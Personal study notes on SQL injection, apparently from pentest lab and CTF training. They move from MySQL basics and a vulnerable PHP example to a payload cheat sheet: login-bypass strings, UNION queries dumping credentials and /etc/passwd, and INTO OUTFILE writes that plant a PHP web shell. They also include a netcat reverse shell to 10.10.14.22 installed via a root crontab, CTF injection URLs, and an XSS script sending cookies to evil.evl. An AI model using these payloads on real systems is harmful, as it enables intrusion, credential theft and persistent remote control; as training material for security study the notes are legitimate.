# SQLi

## Injection types
```
HTTP injection
Code injection
Command injection
SQL injection
```

## Query types
```
Stacked queries
Union queries
```

## Use cases
```
Retrieve secret/sensitive information from the database
Subvert the intended web application logic 
ei bypassing login without passing a valid pair of username and password, 
or access a restricted admin panel
```

## Interactions
```
Command-line tools
Graphical interfaces
APIs
```

## Features
```
Concurrency     Concurrent interactions succeed without corrupting or losing any data.
Consistency     Data remains consistent and valid throughout the database.
Security        Fine-grained security controls through user authentication and permissions.
Reliability     It's easy to backup databases and roll them back to a previous state in case of data loss or a breach.
SQL             SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.
```

## Types
```
File-based
Graph based
Key/Value stores
Non-Relational DBMS (NoSQL)
Relational DBMS (RDBMS)
```

## Relational databases

```
Relational Databases - Data is stored in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables
- Examples -> Oracle, MySQL, MariaDB, MSQL, PostgreSQL, SQLite, Teradata, Hyve ...

⧉   schema   The relationship between tables within a database is called a Schema
🔑  key      Each table can have unique keys, which can link tables together and create relationships between tables
☶   table    Collection of data
⬇   column   Columns
⮕   row      Rows
▭   cell     Intersection of a row and a collumn

         ╔════════╦════════╦════════╦════════╗
         ║   id   ║  user  ║ first  ║ last   ║
         ╠════════╬════════╬════════╬════════╣
         ║   1    ║  admin ║ admin  ║ admin  ║
         ╠════════╬════════╬════════╬════════╣
         ║   2    ║  test  ║ test   ║ test   ║
         ╠════════╬════════╬════════╬════════╣
         ║   3    ║  sa    ║ super  ║ admin  ║
         ╚════════╩════════╩════════╩════════╝
             ⬆
             🔑
             ⬇
╔════════╦════════╦════════╦════════╗
║   id   ║  uid   ║ date   ║ content║
╠════════╬════════╬════════╬════════╣
║   1    ║  2     ║ 010121 ║ Welc.. ║
╠════════╬════════╬════════╬════════╣
║   2    ║  2     ║ 020121 ║ yoma.. ║
╠════════╬════════╬════════╬════════╣
║   3    ║  1     ║ 020121 ║ bruv.. ║
╚════════╩════════╩════════╩════════╝
```

## Non-relational databases
```

Key-Value     - Uses key-value pairs to store data in something like XML, YAML or JSON.
              - Examples -> MongoDB, Couchbase, Redis, etcd ...

Document-Oriented    - Subcategory of Key-Value, focused on storing,
                     - retrieving and managing document-oriented information,
                     - also known as semi-structured data.
                     - Examples -> MongoDB, Couchbase, ElasticSearch ...

Wide-Column   - Names and format of the columns can vary from row to row in the same table,
              - can be interpreted as a two-dimensional key–value store.
              - Examples -> Cassandra, HBase, DataStax Astra/Luna, ClickHouse ...

Graph  - Uses graph structures for semantic queries with nodes, edges,
       - and properties to represent and store data.
       - Examples -> DataStax, SAP HANA, Teradata Aster, RedisGraph, Neo4j ...
```

## Default ports
```
3306 - MySQL/MariaDB
```

## Documentation
[https://dev.mysql.com/doc/refman/8.0/en/data-types.html](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)  

## Mysql client commands
```
-u    user
-p    password
-h    host
-P    port
```
```bash
mysql -u root -p
mysql -u root -P 3306 -h 127.0.0.1 -ppassword
```

## mySQL statements

## DATABASES
```
SHOW GRANTS;            # show current user's privileges
CREATE DATABASE users;  # create db "users"
SHOW DATABASES;         # show all databases
USE users;              # interact with database "users"
```

## Tables
```sql
CREATE TABLE logins (...);  # see the MySQL datatypes in documentation
SHOW TABLES;                # get a list of tables in the current database
DESCRIBE logins:            # get a description of the table "logins" ei the columns and their data types
```

basic create table
```sql
CREATE TABLE logins (
id INT,
username VARCHAR(100),
password VARCHAR(100),
date_of_joining DATETIME,
);
```

create table example with slightly more addvanced properties
```
CREATE TABLE logins (
id INT NOT NULL AUTO_INCREMENT,            # set id value to increment automatically at each entry
username VARCHAR(100) UNIQUE NOT NULL,     # ensure that the username is never left empty and is unique
password VARCHAR(100) NOT NULL,            # password doesn't have to be unique but cannot be empty
date_of_joining DATETIME DEFAULT NOW(),    # set date_of_joining value to current date and time
PRIMARY KEY (id)                           # make id the primary key
);
```

## Properties keywords
```
DATETIME   - datatype - date / time
INT        - datatype - integer
VARCHAR(i) - datatype - variable of max i char

NOT NULL   - constraint - column is never left empty
UNIQUE     - constraint - inserted item is unique

DEFAULT        - sets a default value to an item
AUTO_INCREMENT - auto increment item
NOW()          - returns current date and time in MySQL
```

## Insert statement

add new records by filling the values for all the columns present in the table
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

skip the columns with a set default value or Null allowed by specifying the column names to insert data into
```sql
INSERT INTO table_name(column2, column3, ...) VALUES(column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

## Select statement

show all or some columns for a given table
```sql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```

## Drop statement

use drop to remove tables and databases from the server
```sql
DROP TABLE logins;
```

## Alter statement

```
ALTER TABLE logins ADD newColumn INT;                     # add new column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;  # rename column
ALTER TABLE logins MODIFY oldColumn DATE;                 # change a column's datatype
ALTER TABLE logins DROP oldColumn;                        # remove a column
```

## Update statement

update values for given columns where condition is met
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

update the password for everybody but uid 1
```sql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

## Order by
show the content of hte logins table and order alphabetically by the password field
```sql
SELECT * FROM logins ORDER BY password;
```

descending
```sql
SELECT * FROM logins ORDER BY password DESC;
```

ascending
```sql
SELECT * FROM logins ORDER BY password ASC;
```

sort by multiple columns, to have a secondary sort for duplicate values in one column:
```sql
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

## Limit
only the first 2 results from the table
```sql
SELECT * FROM logins LIMIT 2;
```

show only 2 results from the table starting at an obset of 1
```sql
SELECT * FROM logins LIMIT 1, 2;
```

## Where clause
```sql
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE id > 1
SELECT * FROM logins where username = 'admin';
```

## Like clause
The % symbol acts as a wildcard and matches all characters after admin
```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

The _ symbol is used to match exactly one character
```sql
SELECT * FROM logins WHERE username like '___';
```

## AND operator (&&)
```sql
SELECT 1 = 1 AND 'test' = 'test';
+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|    1                      |
+---------------------------+

SELECT 1 = 1 AND 'test' = 'abc';
+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|   0                      |
+--------------------------+
```

## OR operator (||)
```sql
SELECT 1 = 1 OR 'test' = 'abc';
+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|  1                      |
+-------------------------+

SELECT 1 = 2 OR 'test' = 'abc';
+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|  0                      |
+-------------------------+
```

## NOT operator (!=)
```sql
SELECT NOT 1 = 1;
+-----------+
| NOT 1 = 1 |
+-----------+
|  0        |
+-----------+

SELECT NOT 1 = 2;
+-----------+
| NOT 1 = 2 |
+-----------+
|  1        |
+-----------+
```

## Operator precedence
```
Division (/), Multiplication (*), and Modulus (%)
Addition (+) and Subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)
```

## Operator examples
```sql
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
SELECT * FROM logins WHERE username != 'tom' AND id > 1
SELECT * FROM titles WHERE emp_no > 200000 OR title NOT LIKE '%engineer';
```

## PHP

example of php code reading and printing the whole logins table
```php
<?php
//connect to the db and get all logins table items in $result variable
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);

//print every line from the result with a carriage return
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
?>
```

example of php code printing the searchInput item requested by user from the logins database
```
<?php
//connect to the db and get user searchInput from the logins table
$conn = new mysqli("localhost", "root", "password", "users");
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

//print every line from the result with a carriage return
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
?>
```

if $searchInput="admin" then the above query gets executed
```sql
SELECT * FROM logins WHERE username LIKE '%admin'
```

if $searchInput="admin'; DROP TABLE users;" then normal query for admin in logins table gets executed  
but a second query to drop the table users also gets executed  
adding 2 queries in 1 lines is possible in MSSQL and PostgreSQL but not MySQL  
```
SELECT * FROM logins WHERE username LIKE '%admin'; DROP TABLE users;'
```

## Injection types
```
                                        ╔═════════╗
                                        ║  SQLi   ║
                                        ╚═════════╝
                                             |
                 |'''''''''''''''''''''''''''|''''''''''''''''''''''''''|
            ╔═════════╗                 ╔═════════╗                ╔═════════╗
            ║   IB    ║                 ║  BLIND  ║                ║   OOB   ║  
            ╚═════════╝                 ╚═════════╝                ╚═════════╝
                 |                           |
          |'''''' ''''''|             |'''''' ''''''|
     ╔═════════╗   ╔═════════╗   ╔═════════╗    ╔═════════╗
     ║  UNION  ║   ║  ERROR  ║   ║ BOOLEAN ║    ║  TIME   ║
     ╚═════════╝   ╚═════════╝   ╚═════════╝    ╚═════════╝
```
- Blind - (or inferial) - bool - time
- In Band - Error based - Union based
- Out Of Band -> attacker is unable to use the same channel to launch the attack and gather results.

## MySQL sqli cheat sheat
```
'                   String terminator
"                   String terminator
;                   Query terminator
-- -                Removes the rest of the query
#                   Removes the rest of the query
/*comment this*/    Can be placed anywhere in a query, used for bypassing weak filters
'-- -               End a string and remove rest of the query
';-- -              End a string, end query, and remove rest of the query
OR 1=1-- -          For integers, true test
OR 1=2-- -          For integers, false test
' OR '1'='1'-- -    For strings, test test
AND 1=1-- -         For integers, true test
AND 1=2-- -         For integers, false test
' AND '1'='1'-- -   For strings, true test
?id=2-1             For integers, arithmetic operation would load the resultant post
OR sleep(5)-- -     Blind test

'    %27
"    %22
#    %23
;    %3B
)    %29
```

## MySQL Fingerprinting
```sql
SELECT @@version    Works with MySQL and MSSQL
SELECT POW(1,1)     Will return 1 with MySQL Error-out with other DBMS
SELECT SLEEP(5)     Delays 5 sec with MySQL only no delay with other DBMS
```

## Login evasion
```
admin')--
admin' OR 1=1-- -
' OR '1'='1
' OR '1'='1';-- -
' OR true -- -
```

## Union SQLi
```sql
# The data types of the selected columns on all positions should be the same
# and the two queries should return the same number of columns
SELECT * FROM ports;
SELECT * FROM ships;
SELECT * FROM ports UNION SELECT * FROM ships;

# We can inject a UNION query into the input, such that rows from another table are returned:
# The above query would return username and password entries from the passwords table, assuming the products table has two columns.
SELECT * FROM products WHERE product_id = '1'
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- '

SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords
# it will sometimes be necessary to inject junk in as filling if the original table has more columns than needed
# if injecting junk, 'NULL' fits all data types.
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2, 3, 4 FROM passwords

# leaking some stuff
' UNION SELECT * FROM users-- -
' UNION SELECT 1,username,password,user() FROM users-- -
```

## Detect number of columns with order clause

use order by until the column number doesn't exist
```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
```

## Detect number of columns with union clause

```sql
cn' UNION SELECT 1-- -
cn' UNION SELECT 1,2-- -
cn' UNION SELECT 1,2,3-- -   # and so on
cn' UNION select 1,@@version,3,4-- -  # # attempting to get the version in the second column
```

## Information schema database

will dump a list of all the database on the server
```sql
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

## Databases
union sqli to get all the database names
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

## Database in use
use database() to get the currently used database
```
cn' UNION select 1,database(),2,3-- -
```

## Tables
```
# TABLE_SCHEMA column points to the database each table belongs to
# TABLE_NAME column stores table names
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

## Columns
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

## Data
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables-- -
```

## Privileges
```
# different ways to get current user
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

# union injection payloads to get current user
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, user(), 3, 4-- -

# check if we have super admin privileges
SELECT super_priv FROM mysql.user

# the same as an injection payload
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

# only showing root if multiple users in the database
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

# dump all the privileges we have from the information_schema
SELECT sql_grants FROM information_schema.sql_show_grants

# the same as an injection payload
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

# good risk mitigation practice
# create a read only account for the webapp and GRANT only SELECT privilege to it
# Also don't forget to give a shitty password
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

## Reading files
```
# We need to have FILE priviledge granted for that but if we do it gets interesting
# MySQL user also needs to have enough privileges to read it.
SELECT LOAD_FILE('/etc/passwd');

# union injection payload to dump /etc/passwd in the table
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Writing files
```
# requirements
1  - User with FILE privilege enabled
2  - MySQL global secure_file_priv variable not enabled
3  - Write access to the location we want to write to on the back-end server
```

## Secure file priv
```
# variable is used to determine where to read/write files from
# empty value lets us read files from the entire file system
# NULL means we cannot read/write from any directory
# MariaDB -> empty by default
# MySQL -> /var/lib/mysql-files or NULL by default
secure_file_priv

# check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

# check secure_file_priv from the global_variables table
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

# check secure_file_priv from the global_variables table over a union injection
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

## Select into outfile
```
# dump all content of users table into file
SELECT * from users INTO OUTFILE '/tmp/credentials';

# dump arbitrary text into file
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

# writing text into the webroot of the webserver
SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'

# writing text into the webroot of the webserver over a union injection
# will print -> "1file written successfully!34"
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -

# using "" for the UNION to get a cleaner output in the text file
# will print -> " file written successfully!  "
cn' UNION SELECT "",'file written successfully!',"","" INTO OUTFILE '/var/www/html/proof.txt'-- -

# using the concept to upload a webshell
# will print -> " <?php system($_REQUEST[0]); ?>  "
# the use the shell by giving your command to the parameter 0
# 10.10.10.10:8081/shell.php?0=cat+/etc/passwd
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

## WAF
```
ModSecurity - OpenSource
CloudFlare - Paid

cn' UNION SELECT 1,"file written successfully!",3,4,5 INTO OUTFILE '/tmp/proof.txt'-- -
cn' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4,5 INTO OUTFILE '/tmp/proof.php'-- -
cn' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4,5 INTO OUTFILE '/tmp/proot.php'-- -
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","","" INTO OUTFILE '/tmp/shell.php'-- -
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","","" INTO OUTFILE '/www/shell.php'-- -
cn' UNION SELECT "",'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 1234 >/tmp/f',"","","" INTO OUTFILE '/tmp/shell.sh'-- -
cn' UNION SELECT "",'* * * * * /tmp/shell.sh',"","","" INTO OUTFILE '/var/spool/cron/crontabs/root'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>',"","","" into outfile '/var/www/html/shell.php'-- -

cn' UNION SELECT 1, LOAD_FILE("/etc/crontab"),3,4,5-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"),3,4,5-- -
cn' UNION SELECT 1, LOAD_FILE("/tmp/proot.php"),3,4,5-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/dashboard.php"),3,4,5-- -
cn' UNION SELECT 1, LOAD_FILE("/tmp/shell.sh"),3,4,5-- -
```
```
https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,username,6%20FROM%20users

https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,id,6%20FROM%20users
https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,name,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27

https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27
CREATE TABLE "messages" (id INTEGER PRIMARY KEY, fname CHAR(25), lname CHAR(25), address CHAR(100), email CHAR(50), phone CHAR(25), message CHAR(255)) 6 (2)

https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27messages%27
CREATE TABLE "users" (id INTEGER PRIMARY KEY, username CHAR(25), userimage CHAR(100), userbio CHAR(255), fname CHAR(25), lname CHAR(25)) 6 (2)

https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27messages%27
CREATE TABLE thisisnotthetableyourelookingfor (id INTEGER PRIMARY KEY, nothere TEXT) 6 (2)


https://ctf.tk/ctf/game/gallery-single-post.html?id=1%20union%20select%201,2,3,4,nothere,6%20FROM%20thisisnotthetableyourelookingfor
https://ctf.tk/ctf/game/gallery-single-post.html?id=-1%20union%20select%201,2,3,4,sql,6%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%27%20limit%203%20offset%202;--%20-

https://ctf.tk/ctf/game/gallery-single-post.html?id=-1%20union%20select%201,2,3,4,nothere,6%20FROM%20%27thisisnotthetableyourelookingfor%27%20limit%205%20offset%204;--%20-

<script>
new Image().src="https://evil.evl/cookiemonster.php?"+document.cookie
</script>
```
